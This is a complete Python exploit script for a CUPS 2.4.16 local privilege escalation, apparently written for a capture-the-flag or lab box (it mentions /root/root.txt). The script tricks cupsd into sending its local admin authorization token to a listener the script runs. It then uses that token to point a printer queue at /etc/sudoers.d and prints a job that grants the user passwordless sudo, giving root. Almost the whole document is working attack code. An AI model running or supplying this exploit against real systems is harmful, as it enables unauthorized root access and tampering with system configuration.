#!/usr/bin/env python3
"""GHSA-c54j-2vqw-wpwp — CUPS 2.4.16 local admin token leak + file:// overwrite.

Unprivileged local user on localhost:631:
  1. CUPS-Create-Local-Printer with a bait IPP URI
  2. cupsd reconnects with Authorization: Local (certs/0)
  3. persist the queue as file:///etc/sudoers.d/<user>-pwn
  4. print a raw job → root file overwrite → sudo -n

Run ON THE TARGET (not from Kali). Racey; retries internally.

Usage:
  python3 ghsa_c54j_cups_local.py
  python3 ghsa_c54j_cups_local.py --user aporter --capture-port 9189
"""
from __future__ import annotations

import argparse
import gzip
import os
import socket
import struct
import subprocess
import threading
import time

CAPTURE_HOST = "127.0.0.1"
CAPTURE_PORT = 9189
IPP_HOST = "127.0.0.1"
IPP_PORT = 631
USER = os.environ.get("USER") or "aporter"
PWN_FILE = "/etc/sudoers.d/aporter-pwn"
SUDOERS = f"{USER} ALL=(ALL) NOPASSWD: ALL\n".encode()

IPP_TAG_OPERATION, IPP_TAG_PRINTER, IPP_TAG_END = 0x01, 0x04, 0x03
IPP_TAG_INTEGER, IPP_TAG_BOOLEAN = 0x21, 0x22
IPP_TAG_NAME, IPP_TAG_KEYWORD = 0x42, 0x44
IPP_TAG_URI, IPP_TAG_CHARSET, IPP_TAG_LANGUAGE, IPP_TAG_MIMETYPE = 0x45, 0x47, 0x48, 0x49
IPP_OP_PRINT_JOB = 0x0002
IPP_OP_RESUME_PRINTER = 0x0011
IPP_OP_CUPS_ADD_MODIFY_PRINTER = 0x4003
IPP_OP_CUPS_DELETE_PRINTER = 0x4004
IPP_OP_CUPS_ACCEPT_JOBS = 0x4008
IPP_OP_CUPS_CREATE_LOCAL_PRINTER = 0x4028

def log(m):
    print(m, flush=True)

def enc_raw(tag, name, value: bytes):
    nb = name.encode()
    return bytes([tag]) + struct.pack(">H", len(nb)) + nb + struct.pack(">H", len(value)) + value

def enc(tag, name, value: str):
    return enc_raw(tag, name, value.encode())

def enc_bool(name, v):
    return enc_raw(IPP_TAG_BOOLEAN, name, b"\x01" if v else b"\x00")

def enc_int(name, v):
    return enc_raw(IPP_TAG_INTEGER, name, struct.pack(">i", v))

def ipp_request(op, reqid, op_attrs, printer_attrs=None, document=b""):
    p = bytearray(struct.pack(">BBHI", 2, 0, op, reqid))
    p.append(IPP_TAG_OPERATION)
    for a in op_attrs:
        p.extend(a)
    if printer_attrs:
        p.append(IPP_TAG_PRINTER)
        for a in printer_attrs:
            p.extend(a)
    p.append(IPP_TAG_END)
    p.extend(document)
    return bytes(p)

def parse_headers(header: bytes):
    d = {}
    for line in header.split(b"\r\n")[1:]:
        if b":" not in line:
            continue
        k, v = line.split(b":", 1)
        d[k.decode("latin1").strip().lower()] = v.decode("latin1").strip()
    return d

def http_post(resource, body, auth=None, timeout=2.0):
    hdrs = [
        f"POST {resource} HTTP/1.1",
        f"Host: {IPP_HOST}:{IPP_PORT}",
        "Content-Type: application/ipp",
        f"Content-Length: {len(body)}",
        "Connection: close",
    ]
    if auth:
        hdrs.append(f"Authorization: Local {auth}")
    req = ("\r\n".join(hdrs) + "\r\n\r\n").encode("latin1") + body
    with socket.create_connection((IPP_HOST, IPP_PORT), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(req)
        resp = bytearray()
        while b"\r\n\r\n" not in resp:
            c = s.recv(65536)
            if not c:
                break
            resp.extend(c)
        header, _, rest = bytes(resp).partition(b"\r\n\r\n")
        sl = header.split(b"\r\n", 1)[0].split()
        status = int(sl[1]) if len(sl) > 1 else 0
        cl = int(parse_headers(header).get("content-length", "0") or "0")
        payload = bytearray(rest)
        while len(payload) < cl:
            c = s.recv(65536)
            if not c:
                break
            payload.extend(c)
    return status, bytes(payload[:cl] if cl else payload)

def ipp_status(payload):
    if len(payload) < 8:
        return -1
    return struct.unpack(">BBHI", payload[:8])[2]

def printer_uri(name):
    return f"ipp://localhost:631/printers/{name}"

def op_common():
    return [
        enc(IPP_TAG_CHARSET, "attributes-charset", "utf-8"),
        enc(IPP_TAG_LANGUAGE, "attributes-natural-language", "en"),
        enc(IPP_TAG_NAME, "requesting-user-name", USER),
    ]

def admin_post(token, op, reqid, name, printer_attrs=None):
    body = ipp_request(
        op, reqid,
        op_common() + [enc(IPP_TAG_URI, "printer-uri", printer_uri(name))],
        printer_attrs=printer_attrs,
    )
    http_code, payload = http_post("/admin/", body, auth=token)
    return http_code, ipp_status(payload)

class CaptureServer(threading.Thread):
    def __init__(self, port):
        super().__init__(daemon=True)
        self.port = port
        self.token = None

    def run(self):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
            server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            server.bind((CAPTURE_HOST, self.port))
            server.listen(8)
            server.settimeout(0.25)
            deadline = time.time() + 12
            while time.time() < deadline and not self.token:
                try:
                    conn, _ = server.accept()
                except socket.timeout:
                    continue
                with conn:
                    data = self.read_request(conn)
                    token = self.extract_token(data.decode("latin1", "replace"))
                    if token:
                        self.token = token
                        ipp = (
                            b"\x02\x00\x00\x00\x00\x00\x00\x01\x01"
                            b"\x47\x00\x12attributes-charset\x00\x05utf-8"
                            b"\x48\x00\x1battributes-natural-language\x00\x02en\x03"
                        )
                        reply = (
                            b"HTTP/1.1 200 OK\r\nContent-Type: application/ipp\r\nContent-Length: "
                            + str(len(ipp)).encode()
                            + b"\r\nConnection: close\r\n\r\n"
                            + ipp
                        )
                    else:
                        reply = (
                            b"HTTP/1.1 401 Unauthorized\r\n"
                            b'WWW-Authenticate: Local trc="y"\r\n'
                            b"Content-Length: 0\r\nConnection: close\r\n\r\n"
                        )
                    try:
                        conn.sendall(reply)
                    except Exception:
                        pass

    @staticmethod
    def extract_token(text):
        for line in text.splitlines():
            if line.lower().startswith("authorization: local "):
                return line.split(None, 2)[2]
        return None

    @staticmethod
    def read_request(conn):
        data = bytearray()
        conn.settimeout(5)
        while b"\r\n\r\n" not in data:
            c = conn.recv(4096)
            if not c:
                break
            data.extend(c)
        headers, _, rest = bytes(data).partition(b"\r\n\r\n")
        cl = 0
        for line in headers.split(b"\r\n"):
            if line.lower().startswith(b"content-length:"):
                cl = int(line.split(b":", 1)[1].strip() or b"0")
        body = bytearray(rest)
        while len(body) < cl:
            c = conn.recv(4096)
            if not c:
                break
            body.extend(c)
        return headers + b"\r\n\r\n" + bytes(body)

def create_local_printer(name, device_uri):
    body = ipp_request(
        IPP_OP_CUPS_CREATE_LOCAL_PRINTER, 2,
        op_common() + [enc(IPP_TAG_URI, "printer-uri", "ipp://localhost:631/")],
        printer_attrs=[
            enc(IPP_TAG_NAME, "printer-name", name),
            enc(IPP_TAG_URI, "device-uri", device_uri),
        ],
    )
    req = (
        "POST / HTTP/1.1\r\n"
        f"Host: {IPP_HOST}:{IPP_PORT}\r\n"
        "Content-Type: application/ipp\r\n"
        f"Content-Length: {len(body)}\r\n"
        "Connection: close\r\n\r\n"
    ).encode("latin1") + body
    sock = socket.create_connection((IPP_HOST, IPP_PORT), timeout=2.0)
    sock.sendall(req)
    return sock

def print_payload(name, reqid):
    body = ipp_request(
        IPP_OP_PRINT_JOB, reqid,
        op_common() + [
            enc(IPP_TAG_URI, "printer-uri", printer_uri(name)),
            enc(IPP_TAG_MIMETYPE, "document-format", "application/vnd.cups-raw"),
            enc(IPP_TAG_KEYWORD, "compression", "gzip"),
            enc(IPP_TAG_NAME, "job-name", "pwn"),
        ],
        document=gzip.compress(SUDOERS),
    )
    return http_post(f"/printers/{name}", body)

def capture_token():
    log("[*] start capture server :%s" % CAPTURE_PORT)
    srv = CaptureServer(CAPTURE_PORT)
    srv.start()
    time.sleep(0.2)
    log("[*] CUPS-Create-Local-Printer bait to our IPP")
    sock = None
    try:
        sock = create_local_printer("tokenleak", f"ipp://{CAPTURE_HOST}:{CAPTURE_PORT}/ipp/print")
        time.sleep(2.5)
    except Exception as e:
        log("create_local bait err %s" % e)
    finally:
        if sock:
            try:
                sock.close()
            except Exception:
                pass
    srv.join(timeout=4)
    if not srv.token:
        raise SystemExit("FAILED to capture Local token")
    log("[+] token=%s" % srv.token)
    return srv.token

def persist_and_print(token, name):
    try:
        admin_post(token, IPP_OP_CUPS_DELETE_PRINTER, 1, name)
    except Exception:
        pass
    sock = create_local_printer(name, "file://" + PWN_FILE)
    try:
        for i in range(90):
            reqid = 1000 + i * 4
            for op, attrs in [
                (IPP_OP_CUPS_ADD_MODIFY_PRINTER, [
                    enc(IPP_TAG_NAME, "ppd-name", "raw"),
                    enc_bool("printer-is-shared", True),
                ]),
                (IPP_OP_CUPS_ACCEPT_JOBS, None),
                (IPP_OP_RESUME_PRINTER, None),
            ]:
                try:
                    admin_post(token, op, reqid, name, attrs)
                except Exception:
                    pass
                reqid += 1
            try:
                print_payload(name, reqid)
            except Exception:
                pass
            if os.path.exists(PWN_FILE):
                try:
                    if os.path.getsize(PWN_FILE) > 0:
                        return True
                except OSError:
                    pass
            time.sleep(0.015)
    finally:
        try:
            sock.close()
        except Exception:
            pass
    return os.path.exists(PWN_FILE)

def main():
    global USER, PWN_FILE, SUDOERS, CAPTURE_PORT, IPP_PORT
    ap = argparse.ArgumentParser(description="GHSA-c54j-2vqw-wpwp local CUPS 2.4.16 privesc")
    ap.add_argument("--user", default=os.environ.get("USER") or "aporter")
    ap.add_argument("--sudoers", default=None, help="path to write (default /etc/sudoers.d/<user>-pwn)")
    ap.add_argument("--capture-port", type=int, default=9189)
    ap.add_argument("--ipp-port", type=int, default=631)
    args = ap.parse_args()
    USER = args.user
    PWN_FILE = args.sudoers or ("/etc/sudoers.d/%s-pwn" % USER)
    SUDOERS = ("%s ALL=(ALL) NOPASSWD: ALL\n" % USER).encode()
    CAPTURE_PORT = args.capture_port
    IPP_PORT = args.ipp_port

    log("uid=%s user=%s pwn=%s" % (os.getuid(), USER, PWN_FILE))
    token = capture_token()
    for attempt in range(1, 15):
        name = "sudo%d%d" % (attempt, int(time.time()) % 10000)
        log("[*] persist attempt %d printer=%s" % (attempt, name))
        persist_and_print(token, name)
        r = subprocess.run(["sudo", "-n", "id"], capture_output=True, text=True)
        log("sudo -n id rc=%s out=%r err=%r" % (r.returncode, r.stdout.strip(), r.stderr.strip()[:200]))
        if r.returncode == 0:
            log("[+] ROOT")
            print(r.stdout)
            log("[+] sudo -n works; read /root/root.txt on the box yourself")
            return
    raise SystemExit("did not get root")


if __name__ == "__main__":
    main()
